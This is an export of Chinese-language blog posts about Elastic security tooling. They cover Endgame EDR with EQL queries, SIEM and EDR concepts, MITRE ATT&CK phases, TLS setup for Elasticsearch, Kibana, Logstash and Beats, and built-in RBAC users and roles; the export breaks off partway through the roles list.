        <content type="html"><![CDATA[<p>這篇文章會分享 Elastic Endgame 這個終端安全產品的體驗心得。</p><h2 id="端點防護產品簡介"><a href="#端點防護產品簡介" class="headerlink" title="端點防護產品簡介"></a>端點防護產品簡介</h2><p>像前幾篇文章中介紹的，Elastic Beats 其實蒐集了各式各樣的資料，涵蓋網路封包、Log、指標、Audit 資訊等等安全性導向 (Security-Oriented) 的資料，終端安全防護自然而然就成為 Elastic 其中一個產品線，2019 Elastic 更宣布買下了終端安全的資安業者 <a href="https://www.elastic.co/blog/endgame-joins-forces-with-elastic">Endgame</a>，宣示了往端點 (Agent-Based) 安全應用發展的決心。</p><p>那 Elastic 可以協助我們解決或回答哪些問題?</p><ul><li>事件或攻擊發生的先後順序?</li><li>資安事件發生時產生了哪些檔案或是流量?</li><li>攻擊已經結束了嗎? 還是還在持續?</li></ul><h2 id="Endgame-簡介"><a href="#Endgame-簡介" class="headerlink" title="Endgame 簡介"></a>Endgame 簡介</h2><p>Endgame 本來就是一家提供端點安全服務解決方案的產品，搭配分析 Elastic Stack SIEM 中統一格式的 ECS (Elastic Common Schema) 把原來 Elastic Stack 的功能可以說是完全提升了一個層次，強化了端點安全的預防、偵測、回應 (EPP + EDR) 功能，此外也開發了一些厲害的功能，這次實際上用起來覺得蠻神奇的。</p><ul><li>提供 <a href="https://www.elastic.co/blog/introducing-event-query-language">EQL</a>(Event Query Language) 支援: 事件版本的 SQL 的語言<ul><li>能夠更方便的找出有相依性的相關資訊</li></ul></li><li>Artemis: 可以看成是資安版本的 Siri 或是 Google assistant<ul><li>透過直觀自然的指令像是 <code>Find the process wmic.exe</code> 就可以找到相關資料</li><li>透過 Chatbot + 人工智慧解決傳統搜尋介面較比較不友善的問題</li></ul></li></ul><blockquote><p>透過 Chatbot + 人工智慧解決傳統搜尋介面較比較不友善的問題<br><img src="/2020/09/17/elastic-endpoint-security-application/EndgameArtemis.png" alt="EndgameArtemis"></p></blockquote><h2 id="EQL"><a href="#EQL" class="headerlink" title="EQL"></a>EQL</h2><p>EQL 可以執行簡單的條件判斷和範圍指定</p><ul><li><code>process where sha256==&quot;551d62be381a429bb594c263fc01e8cc9f80bda97ac3787244ef16e3b0c05589&quot;</code></li><li><code>any where timestamp_utc &gt;= &quot;2018-04-01 12:00:0Z&quot; and timestamp_utc &lt;= &quot;2018-04-01 12:05:0Z&quot;</code></li></ul><p>也可以將條件組合成複雜的指令</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">network <span class="keyword">where</span></span><br><span class="line">event_subtype_full <span class="operator">=</span><span class="operator">=</span> &quot;ipv4_connection_attempt_event&quot; <span class="keyword">and</span></span><br><span class="line">process_name <span class="operator">=</span><span class="operator">=</span> &quot;svchost.exe&quot; <span class="keyword">and</span></span><br><span class="line">destination_port <span class="operator">=</span><span class="operator">=</span> <span class="number">1337</span> <span class="keyword">and</span></span><br><span class="line">(destination_address <span class="operator">=</span><span class="operator">=</span> &quot;192.168.*&quot; <span class="keyword">or</span> destination_address <span class="operator">=</span><span class="operator">=</span> &quot;172.16.*&quot;)</span><br><span class="line"><span class="operator">|</span> <span class="keyword">unique</span> destination_address destination_port</span><br></pre></td></tr></table></figure><h2 id="使用-Endgame"><a href="#使用-Endgame" class="headerlink" title="使用 Endgame"></a>使用 Endgame</h2><blockquote><p>透過介面建立並下載 Senser Profile<br><img src="/2020/09/17/elastic-endpoint-security-application/EndgameSenserProfile.png" alt="EndgameSenserProfile"></p></blockquote><p>透過下面的指令，使用剛才建立並下載的 Profile 配置我們的 Sensor:</p><ul><li><code>SensorWindowsInstaller-&lt;profile_name&gt;.exe -c SensorWindowsInstaller-&lt;profile_name&gt;..cfg -k &lt;api_key&gt; -d false -l install.log</code><ul><li><code>&lt;profile_name&gt;</code>: 就是剛才建立的名稱</li><li><code>&lt;api_key&gt;</code> 在建立後產生的 API key</li></ul></li></ul><blockquote><p>透過剛剛下載的 Profile 配置並啟動 Senser 後會出現在列表<br><img src="/2020/09/17/elastic-endpoint-security-application/EndgameEndpoint.png" alt="EndgameEndpoint"></p></blockquote><blockquote><p>打開偽裝的 IE，會發現開啟 CMD 後跑了很多指令<br><img src="/2020/09/17/elastic-endpoint-security-application/OpenFakeIE.png" alt="OpenFakeIE"></p></blockquote><blockquote><p>從 Alert 中查看影響路徑與範圍<br><img src="/2020/09/17/elastic-endpoint-security-application/EndgameAlert.png" alt="EndgameAlert"></p></blockquote><blockquote><p>這時候就要設定遇到 Malware 的反應機制，設定阻擋並跳通知<br><img src="/2020/09/17/elastic-endpoint-security-application/EndgameAdminPolicy.png" alt="EndgameAdminPolicy"></p></blockquote><blockquote><p>再打開偽裝的 IE、會發現已阻擋<br><img src="/2020/09/17/elastic-endpoint-security-application/EndgameMalwareIntercepted.png" alt="EndgameMalwareIntercepted"></p></blockquote><blockquote><p>從新的 Alert 可以發現影響路徑與範圍變小<br><img src="/2020/09/17/elastic-endpoint-security-application/EndgameAlertAfter.png" alt="EndgameAlertAfter"></p></blockquote><h2 id="Endgame-體驗心得"><a href="#Endgame-體驗心得" class="headerlink" title="Endgame 體驗心得"></a>Endgame 體驗心得</h2><p>Endgame 開發的是端點保護平台，但現在的資安威脅不再只能用單純的 IOCs (Indicators of Compromise) 來描述，所以才會有像 MITRE 提出 <a href="/2020/09/16/elastic-security-quick-start/#%E5%B0%8D%E6%89%8B%E5%A8%81%E8%84%85%E8%A1%8C%E7%82%BA%E5%81%B5%E6%B8%AC-Adversary-Behavior-Detection">ATT&amp;CK</a> 這樣的框架來協助解構複雜的威脅。</p><p>對買下 Endgame 的 Elastic 來說:</p><ul><li>Elastic Beats 提供 Security-Oriented 的資料</li><li>深度整合原來既有的 SIEM 上</li><li>數據與人工智慧的整合</li></ul><p>兩個平台的結合可以說是相輔相成如虎添翼，完整的紀錄加上檢索引擎，相信在往後的檢討分析或是針對資安系統的 PDCA 都會有蠻大的幫助，當然完整的生態系可以說是優點也可以說是缺點，缺點大概就是用下去就會因為很方便而很難轉換。</p>]]></content>
      
      
      <categories>
          
          <category> ElasticCloud </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ElasticCloud </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Elastic Security Quick Start</title>
      <link href="/2020/09/16/elastic-security-quick-start/"/>
      <url>/2020/09/16/elastic-security-quick-start/</url>
      
        <content type="html"><![CDATA[<p>前幾篇文章介紹了怎麼透過 Kibana 加入 APM、Logs、Metircs 到 Elasticsearch 中，這篇文章會是 Kibana 介面上的最後一片拼圖 Security 的部分，主要是加入安全相關的事件監控數據，可以說是一套 Elastic Stack 的 SIEM。</p><blockquote><p>點選下圖箭頭就可以開始加入資料<br><img src="/2020/09/16/elastic-security-quick-start/AddSecurity.JPG" alt="AddSecurity"></p></blockquote><h2 id="SIEM"><a href="#SIEM" class="headerlink" title="SIEM"></a>SIEM</h2><p>SIEM 彙整並監控各種伺服器的日誌、網路安全資訊，像是防火牆、網路流量、路由器的紀錄等等，然後產生報表，SIEM 架構可以簡單分成三個部分：</p><ul><li>Beats(connector): 事件收集器</li><li>Kibana + Elasticsearch(logger management): 日誌管理系統</li><li>Kibana(correlation): 事件關連分析平台</li></ul><h2 id="Beats"><a href="#Beats" class="headerlink" title="Beats"></a>Beats</h2><p>Beats 可以安裝在 server 上協助傳送資訊到 Elasticsearch 或 Logstash，除了這次要用到的 以外還有一堆很厲害的 beat 系列工具，這次跟安全事件相關的有 <a href="https://www.elastic.co/guide/en/beats/winlogbeat/7.9/winlogbeat-installation-configuration.html">Winlogbeat</a>、<a href="https://www.elastic.co/guide/en/beats/auditbeat/7.9/auditbeat-installation-configuration.html">Auditbeat</a>、Packetbeat，這次只有安裝前面兩個。</p><p>使用 Beats 的步驟也很簡單，跟之前介紹得差不多，就是</p><ul><li>下載後解壓縮</li><li>設定相關配置檔 (<code>$&#123;XXX&#125;beat.yml</code>)</li><li>啟動 (<code>./$&#123;XXX&#125;beat.exe -e</code>)</li><li>需要常駐在背景跑才需要註冊服務。</li><li>到 kibana Dashboard 查看 Dashboard</li></ul><blockquote><p>Winlogbeat 安裝後的 Dashboard: 紀錄事件<br><img src="/2020/09/16/elastic-security-quick-start/Winlogbeat.JPG" alt="Winlogbeat"></p></blockquote><blockquote><p>Auditbeat 安裝後的 Dashboard: 紀錄執行了哪些程式<br><img src="/2020/09/16/elastic-security-quick-start/AuditbeatSystem.JPG" alt="AuditbeatSystem"></p></blockquote><h2 id="Elastic-Endpoint-Security"><a href="#Elastic-Endpoint-Security" class="headerlink" title="Elastic Endpoint Security"></a>Elastic Endpoint Security</h2><p>這個功能目前還在 Beta 中，分成兩方面去做 Endpoint Security</p><ul><li>威脅偵測 Exploits</li><li>對手威脅行為偵測 Adversary Behavior Detection</li></ul><p>使用上也是按照<a href="https://www.elastic.co/guide/en/security/current/install-endpoint.html">官方文件</a>進行安裝，然後進行 <code>elastic-agent.yml</code> 的配置，不過預設的配置檔看起來是給 linunx 用的，這個部分就沒測試，不過介面看起來相關規則都可以進一步新增，官方目前也有提供一些預設的<a href="https://github.com/elastic/detection-rules/tree/main/rules">規則範例</a>可以參考。</p><blockquote><p>可以新增偵測的相關規則<br><img src="/2020/09/16/elastic-security-quick-start/DetectionRules.JPG" alt="DetectionRules"></p></blockquote><h2 id="威脅偵測-Exploits"><a href="#威脅偵測-Exploits" class="headerlink" title="威脅偵測 Exploits"></a>威脅偵測 Exploits</h2><p>威脅是能夠被偵測或被預防，Elastic Endpoint Security 的 Sensor 會使用 DBI (dynamic binary instrumentation)，因為程式大部分都是 Build 過的也看不到原始碼，DBI 是透過在執行的 binary 中即時注入程式碼來分析程式行為的方法，常見的框架是 Pin、DynamoRIO、Frida，Elastic Endpoint Security 的 Sensor 偵測出底下幾種類別的威脅:</p><ul><li>漏洞 (Exploits): 漏洞防範的規則預設會被應用在瀏覽器、MS Office、Adobe Reader、Java<ul><li>Critical API: 監控是否有被執行</li><li>Header Protection: PE header 是不是有被嘗試讀取</li><li>Macro Protection: MS Office 是否嘗試執行 VBA Macro</li><li>Return Heap: Heap 記憶體內容是否有被嘗試 return</li><li>Return Oriented Programming (ROP) Chain: 是否嘗試執行被保護的 function</li><li>Shellcode Threats: 偵測是否有 thread 的開始位置不在目前模組中</li><li>Stack Memory: 是否嘗試修改 Stack 分頁檔</li><li>Stack Pivot: 是否有 thread stack 被攔截</li><li>UNC Path: Universal Name Convention (UNC) 路徑是否有被使用</li></ul></li><li>惡意程式 (Malware): 會透過機器學習算出來的分數來預防</li><li>黑名單 (Blacklist): 像是 andriod 預設無法安裝不是 Google Market 的 APK<ul><li>直接用副檔名排除，像是 .dll 等</li></ul></li><li>憑證存取 (Credential Access): 是否有被嘗試存取任何憑證</li><li>特權提升 (Privilege Escalation): 是否有偷用額外的權限</li><li>處理程序注入 (Process Injection): 不用執行檔案靠漏洞就可以把想執行的程式植入，像是 SQL Injection?</li><li>勒索軟體 (Ransomware)</li></ul><h2 id="對手威脅行為偵測-Adversary-Behavior-Detection"><a href="#對手威脅行為偵測-Adversary-Behavior-Detection" class="headerlink" title="對手威脅行為偵測 Adversary Behavior Detection"></a>對手威脅行為偵測 Adversary Behavior Detection</h2><p>至於怎麼找出並對手的威脅行為，MITRE 有提出 <a href="https://attack.mitre.org/matrices/enterprise/">ATT&amp;CK</a> 這套資安框架，透過這套框架找出對手可能的戰略、戰術、流程，也能協助 EDR (Endpoint Detection and Response) 工具的評估與測試。</p><ul><li>A(Adversarial): 對抗性的攻擊者</li><li>T(Tactics): 戰略</li><li>T(Technical): 技術手法</li><li>CK(Common knowledge): 通用的知識庫</li></ul><p><a href="https://attack.mitre.org/matrices/enterprise/">ATT&amp;CK</a> 的核心概念在把常見的威脅的行為分成</p><ul><li>階段</li><li>活動</li></ul><p>主要會有以下的幾個大階段與行為:</p><ul><li>入侵初期(Initial Access)</li><li>持續潛伏(Persistence): 嘗試維持自己在重開機之後仍能存活</li><li>執行(Execution): 嘗試執行惡意程式</li><li>權限提升(Privilege Escalation): 嘗試得到更高權限，像是 root 或是 admin</li><li>防禦逃脫(Defense Evasion): 嘗試躲過掃描</li><li>憑證存取(Credential Access): 嘗試存取密碼及憑證</li><li>發現(Discovery): 嘗試了解系統環境</li><li>橫向移動(Lateral Movement): 邊移動邊在尋找最終攻擊目標</li><li>收集(Collection): 是否有常識蒐集資料的行為</li><li>命令與控制(Command and Control): 是否嘗試控制還原系統</li><li>滲出(Exfiltration): 嘗試偷資料</li><li>衝擊(Impact):試圖控制、中斷、摧毀系統與資料</li></ul>]]></content>
      
      
      <categories>
          
          <category> ElasticCloud </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ElasticCloud </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Elastic Security 簡介</title>
      <link href="/2020/09/15/elastic-endpoint-security/"/>
      <url>/2020/09/15/elastic-endpoint-security/</url>
      
        <content type="html"><![CDATA[<p>前面幾天的文章都著重在 Log 產生及彙整管理，管理也可以用 Graylog 或 Loggly 這些很棒的工具，但需要進行資安分析，需要的就會是 SIEM，除了 SEIM 以外最近還有很紅的 EDR，其中 Elastic Endpoint Security 就是一套類似 EDR 的解決方案。</p><p>上面看到很多名詞很陌生嗎? 這篇文章將淺談端點安全、EDR、SIEM、Elastic Endpoint Security 的基礎概念。</p><h2 id="端點安全簡介"><a href="#端點安全簡介" class="headerlink" title="端點安全簡介"></a>端點安全簡介</h2><p>大家還記得前陣子 Garmin 遇到資安事件全球大當機三天、讀冊生活資料外洩等等最近的資安事件嗎? 近十年來由於 IT 相關產業快速的發展，資安問題也越來越多，資安工程師常會遇到的問題可能如下:</p><ul><li>公司內部電腦目前安全狀況如何?</li><li>怎麼偵測到被忽視的攻擊?</li><li>怎麼發現一些潛在的危險事件或行為?</li><li>各式各樣端點傳來的 Log 該怎麼整合怎麼判斷?</li><li>這次的攻擊是怎麼發生的?</li></ul><p>所以這時候就會需要一套可偵測管理、持續性監看、簡單配置的端點安全系統。</p><h2 id="SIEM"><a href="#SIEM" class="headerlink" title="SIEM"></a>SIEM</h2><p>一套 SIEM 主要結合了:</p><ul><li>SIM (security information management)</li><li>SEM (security event management)</li></ul><p>SIEM 彙整並監控各種伺服器的日誌、網路安全資訊，像是防火牆、網路流量、路由器的紀錄等等，然後產生報表，SIEM 架構可以簡單分成三個部分：</p><ul><li>事件收集器 (connector)</li><li>日誌管理系統 (logger management)</li><li>事件關連分析平台 (correlation)</li></ul><p>看起來這三個部分是不是有點熟悉，當把 Elasticsearch 該裝的該設定處理好其實也就是一套 SIEM，但 SIEM 並未內建回應機制，只是一項偵測工具。</p><h2 id="EDR"><a href="#EDR" class="headerlink" title="EDR"></a>EDR</h2><p>最近 Endpoint 防禦的觀念逐漸普及，EDR (Endpoint Detection and Response) 就是端點偵測與回應的解決方案，國內外資安廠商都有出相關產品，開源的像是 OSSEC、osquery 也很棒。</p><p>在讀了<a href="https://blog.trendmicro.com.tw/?p=61676">網路上的相關知識</a>後幾個相關的名詞解釋如下:</p><ul><li>EDR (Endpoint Detection and Response): 端點偵測及回應，行為特徵的彙整，資訊的蒐集與辨識，來讓相關人員或防毒軟體做出反應</li><li>XDR: Cross Detection and Response 全面偵測及回應，除了端點訊息以外再提供更多一些，可以想像是跨平台的 EDR (Network, Endpoint, Server, messaging, 3rd party logs)</li><li>EPP: 端點防護平臺 Endpoint Protection Platform，高度整合的防護平台，透過固定的特徵碼識別機制處理問題</li></ul><h2 id="Elastic-Endpoint-Security"><a href="#Elastic-Endpoint-Security" class="headerlink" title="Elastic Endpoint Security"></a>Elastic Endpoint Security</h2><p>Elastic Endpoint Security 就是一套類似 EDR 的解決方案，透過配置 Sensor 及相關的保護政策來提供 Windows, Linux, Mac 端點保護，一套 Endpoint Security Platform 可以監控 100K 個端點，使用當然就按照 <a href="https://www.elastic.co/guide/en/security/current/install-endpoint.html">Elastic Endpoint 官方文件</a>進行相關安裝，主要分成三大塊:</p><ul><li>建立保護政策 (Protection Policy)<ul><li>threats: 透過行為分析與機器學習來辨識</li><li>adversary behaviors: 透過蒐集本機 event data 來辨識</li></ul></li><li>建立 Sensor Profile<ul><li>連接的 IP or domain name</li><li>使用的 proxy</li><li>套用哪個保護政策</li><li>要監控哪些類型的檔案是否有被修改</li><li>Local 要存多大容量的事件 Log</li></ul></li><li>建置發佈 Sensor 到機台上<ul><li>In-band: 只能用在 windows 平台，需要啟用 WinRM (Windows Remote Management)</li><li>Out-of-band: 透過 SCCM, BigFix, PDQDeploy 等工具<ul><li>下載相關 Sensor Profile</li><li>執行相關指令</li></ul></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> ElasticCloud </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ElasticCloud </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Elastic 加密傳輸</title>
      <link href="/2020/09/14/elastic-secure-communications/"/>
      <url>/2020/09/14/elastic-secure-communications/</url>
      
        <content type="html"><![CDATA[<p>這篇文章將提到怎麼透過啟用加密傳輸，讓 Elasticsearch 的資料更安全，以及 Elasticsearch 在使用加密傳輸的重要性和需要注意的地方。</p><h2 id="Inside-an-Elasticsearch-Cluster"><a href="#Inside-an-Elasticsearch-Cluster" class="headerlink" title="Inside an Elasticsearch Cluster"></a>Inside an Elasticsearch Cluster</h2><p>在 Elasticsearch Cluster 不同的節點之間，如果沒有進行加密溝通的情況下，這時候，可能在有一天檢查節點的時候會發現，原來這是一個間諜節點，而且正在監看我們之間傳輸的訊息，原因很單純就是沒有認證所以想加入就可以加入。</p><p>加入方法也很簡單就是透過 TLS 進行資料傳輸，每個節點都需要安裝 CA 憑證，節點加入會分成三種情境</p><ul><li>Certificate: 只要是用同張 CA 憑證就可以加入</li><li>Full Verification: 憑證相同且伺服器的 hostname 或 IP 也要正確</li><li>沒有認證: 慘不忍睹?</li></ul><p>產生方法只要是符合 X.509 規格的方法都可以，也可以使用 Elasticsearch 提供的 <a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/certutil.html">elasticsearch-certutil</a></p><ul><li><code>bin/elasticsearch-certutil ca</code></li><li>預設會產生的檔案 <code>elastic-stack-ca.p12</code><ul><li>包含 node certificate, node key, and CA certificate.</li></ul></li><li><code>bin/elasticsearch-certutil cert --ca /path/to/your/ca</code><ul><li>產生私鑰，產生後要存放好</li></ul></li></ul><p>接著就是設定 <code>elasticsearch.yml</code> 啟用 ssl 然後填上憑證位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">xpack.security.transport.ssl.enabled: true</span><br><span class="line">xpack.security.transport.ssl.verification_mode: certificate</span><br><span class="line">xpack.security.transport.ssl.keystore.path: certs/elastic-certificates.p12</span><br><span class="line">xpack.security.transport.ssl.truststore.path: certs/elastic-certificates.p12</span><br></pre></td></tr></table></figure><p>IP&#x2F;hostname 黑&#x2F;白名單設定</p><ul><li>可以在 <code>elasticsearch.yml</code> 進行設定</li><li>打 API 進行規則新增</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">xpack.security.transport.filter.allow: localhost</span><br><span class="line">xpack.security.transport.filter.deny: &#x27;*.google.com&#x27;</span><br><span class="line">xpack.security.http.filter.allow: 140.116.250.3</span><br><span class="line">xpack.security.http.filter.deny: all</span><br><span class="line"></span><br><span class="line">PUT /_cluster/settings</span><br><span class="line">&#123;</span><br><span class="line">    &quot;persistent&quot; : &#123;</span><br><span class="line">        &quot;xpack.security.transport.filter.allow&quot; : &quot;172.16.0.0/24&quot;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Outside-an-Elasticsearch-Cluster"><a href="#Outside-an-Elasticsearch-Cluster" class="headerlink" title="Outside an Elasticsearch Cluster"></a>Outside an Elasticsearch Cluster</h2><p>在 Elasticsearch Cluster 跟外部的溝通預設也是沒有提供加密傳輸的，所以只要是有能力攔截封包，就可以直接得到敏感資料，所以針對以下也需要進行設定:</p><ul><li>Kibana</li><li>Beats</li><li>Logstash</li><li>Elastic Client</li></ul><p>啟用加密傳輸的設定也不難，client 是啟用 SSL 一樣都是找到配置檔設定啟用，然後把憑證的位置放好設定對即可，需要注意的是只要設定啟用後，就只能唯一使用加密傳輸，全部的 client 都要進行相關設定，不然就無法使用，如果是用工具產生出來的 PKCS#12 就內建 truststore 跟 keystore，路徑填一樣就可以了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">xpack.security.http.ssl.enabled: true</span><br><span class="line">xpack.security.http.ssl.keystore.path: certs/elastic-certificates.p12</span><br><span class="line">xpack.security.http.ssl.truststore.path: certs/elastic-certificates.p12</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Elasticsearch 設定啟用 https 後，首先 kibana 需要進行相關設定，但目前不支援 PKCS#12 keystore 所以要用 crt 檔，相關指令如下</p><p><code>bin/elasticsearch-certutil cert --ca /path/to/your/ca --pem</code></p><p>首先先啟用 elasticsearch 跟 kibana 之間的加密傳輸，<code>kibana.yml</code> 設定如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">elasticsearch.hosts: [&quot;https://&lt;your_elasticsearch_host&gt;:9200&quot;]</span><br><span class="line">elasticsearch.ssl.certificateAuthorities: /path/to/your/ca.crt</span><br></pre></td></tr></table></figure><p>然後是啟用 kibana 跟瀏覽器之間的加密傳輸</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">server.ssl.enabled: true</span><br><span class="line">server.ssl.key: /path/to/your/key</span><br><span class="line">server.ssl.certificate: /path/to/your/crt</span><br></pre></td></tr></table></figure><p>接著是 Logstash 和 Beats 的部分，沒有跟瀏覽器溝通的介面所以只需要設定一次就好，Logstash 跟 kibana 一樣也不支援 PKCS#12 keystore 一樣是要產生 PEM 檔，然後改設定。</p><blockquote><p>Logstash</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">output &#123;</span><br><span class="line">  elasticsearch &#123;</span><br><span class="line">    ...</span><br><span class="line">    ssl =&gt; true</span><br><span class="line">    cacert =&gt; &#x27;/path/to/cert.pem&#x27;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>Beats</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">output.elasticsearch:</span><br><span class="line">  hosts: [&quot;https://&lt;your_elasticsearch_host&gt;:9200&quot;]</span><br><span class="line">  ssl.certificate_authorities: [&quot;/etc/pki/root/ca.pem&quot;]</span><br></pre></td></tr></table></figure><blockquote><p>Client Applications</p></blockquote><p>因為會用不同語言去寫，Elasticsearch 有提供不同的範例，文件如下:</p><p><a href="https://www.elastic.co/guide/en/elasticsearch/client/index.html">https://www.elastic.co/guide/en/elasticsearch/client/index.html</a></p><h2 id="Elasticsearch-加密傳輸重點整理"><a href="#Elasticsearch-加密傳輸重點整理" class="headerlink" title="Elasticsearch 加密傳輸重點整理"></a>Elasticsearch 加密傳輸重點整理</h2><ul><li>Elasticsearch 透過啟用加密傳輸協定可以保護敏感資料</li><li>Elasticsearch 提供了 certutil tool 可以產生憑證供 Node 間使用</li><li>Node certificates 是給 Node 間溝通用的</li><li>IP 黑白名單可以提供多一層防護</li><li>client 端到 Elasticsearch 也要啟用加密傳輸</li><li>不管是 Kibana 到 Elasticsearch 或是到瀏覽器端之間的傳輸都可以加密</li><li>Logstash 跟 Beats 到 Elasticsearch 的傳輸也要加密</li><li>啟用後 Client 就只支援 https</li></ul>]]></content>
      
      
      <categories>
          
          <category> ElasticCloud </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ElasticCloud </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Elastic 操作權限管理</title>
      <link href="/2020/09/13/elastic-security-role-based-access-control/"/>
      <url>/2020/09/13/elastic-security-role-based-access-control/</url>
      
        <content type="html"><![CDATA[<p>這篇文章主要會簡介 Role-Based Access Control (RBAC)，因為當沒有任何權限控管時，每個人都可以對 Index 進行讀取和修改，這樣就毫無隱私及安全性可言，所以 Elasticsearch 提供了 Role-Based Access Control (RBAC) 讓管理者進行相關設定。</p><h2 id="Role-Based-Access-Control"><a href="#Role-Based-Access-Control" class="headerlink" title="Role-Based Access Control"></a>Role-Based Access Control</h2><p>RBAC 機制中，每個使用者可能會得到很多不同的角色，每個角色擁有不同的層級的權限，角色可以提供選取的權限非常多種，可以參考<a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.4/security-privileges.html">文件中 security-privileges 的部分</a>。</p><p>在我們把<a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.9/configuring-security.html">機制啟動</a>之後，可以<a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/setup-passwords.html">設置相關密碼</a>，Elasticsearch 其實本來就有提供預設的使用者及角色，相關的設定都會存放在特定的 Index 中，主要是讓相關的服務像是 Beats、Kibana 等可以運作，所以接下來就會從預設值開始了解。</p><h2 id="Built-in-Users"><a href="#Built-in-Users" class="headerlink" title="Built-in Users"></a>Built-in Users</h2><p>Elastic Stack 在安全性方面，提供了一些內建的使用者，會存放在 <code>.security</code> Index 裡面，想要修改<a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.4/built-in-users.html#bootstrap-elastic-passwords">預設的密碼</a>就可以透過這個指令 <code>bin/elasticsearch-setup-passwords interactive</code> 來設定，內建的使用者，看文件看說明也可以在各服務找到<a href="https://www.elastic.co/guide/en/kibana/current/using-kibana-with-security.html">對應的 yml</a> (<code>kibana.yml</code>)去修改。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">elasticsearch.username: &quot;kibana_system&quot;</span><br><span class="line">elasticsearch.password: &quot;kibanapassword&quot;</span><br></pre></td></tr></table></figure><p>內建的使用者列表與細節如下，剛開始可先用 elastic 測試連線與功能，之後再創一個常用的使用者。</p><ul><li><code>elastic</code>(超級使用者): 擁有存取全部 cluster 的權限，沒設定的話預設本來就會有<a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.4/built-in-users.html#bootstrap-elastic-passwords">預設密碼</a></li><li><code>kibana_system</code>(一般使用者): 給 Kibana 服務跟 Elasticsearch 互動用的帳號</li><li><code>logstash_system</code>(一般使用者): Logstash 存資料進 Elasticsearch 用</li><li><code>beats_system</code>(一般使用者): 給不同類型的 beat 儲存或監控 Elasticsearch</li><li><code>apm_system</code>(一般使用者): APM server 使用，儲存或監控 Elasticsearch</li><li><code>remote_monitoring_user</code>(一般使用者): 特別給 Metricbeat 使用，可以蒐集儲存相關需監控的資訊</li></ul><h2 id="Built-in-Roles"><a href="#Built-in-Roles" class="headerlink" title="Built-in Roles"></a>Built-in Roles</h2><p>剛開始創建使用者，可能發現權限很多有點難懂，也可以先使用<a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.4/built-in-roles.html">內建的角色</a>去進行相關安排，每個使用者都有一個預設的角色，允許去打 Auth 的 API 還有讀取或修改自己的相關資訊，像是修改密碼等等。</p><ul><li><code>apm_system</code>: 給跟 APM 系統同等級的權限，可以傳送相關資訊</li><li><code>apm_user</code>: APM 使用者用，像是針對 <code>apm-*</code>、<code>.ml-anomalies*</code> 有 <code>read</code>、<code>view_index_metadata </code> 的權限</li><li><code>beats_admin</code>: <code>.management-beat</code>的控制權，進行相關 Beats 的配置</li><li><code>beats_system</code>: 能傳送系統層級的監控資訊，不適合給使用者</li><li><code>data_frame_transforms_admin</code>: 管理 transforms，包含 kibana 中機器學習模組的權限</li><li><code>data_frame_transforms_user</code>: 使用 transforms，包含 kibana 中機器學習模組的權限</li><li><code>ingest_admin</code>: 可以管理全部的 Index、Pipeline，但不包含創建</li><li><code>kibana_dashboard_only_user</code>: 只能讀取 Dashborad 用</li><li><code>kibana_system</code>: 任何足夠管理 Kibana 的相關權限 <code>.monitoring-*</code>、<code>.reporting-*</code>，不適合給使用者</li><li><code>kibana_user</code>: 可以存取所有 Kibana 功能</li><li><code>logstash_admin</code>: <code>.logstash*</code> 的控制權，管理相關配置</li><li><code>logstash_system</code>: Logstash system 層級的相關權限，不適合給使用者</li><li><code>machine_learning_admin</code>: 機器學習相關的控制權</li><li><code>machine_learning_user</code>: 存取機器學習相關最小的權限配置</li><li><code>monitoring_user</code>: 監控 Index 的最小權限配置</li><li><code>remote_monitoring_agent</code>: 寫資料到 <code>.monitoring-*</code>、<code>metricbeat-*</code> 中的最小權限配置</li><li><code>remote_monitoring_collector</code>: 可以蒐集 Elastic Stack 監控相關資料的最小權限配置</li><li><code>reporting_user</code>: 只能存取自己相關報告的權限</li><li><code>snapshot_user</code>: 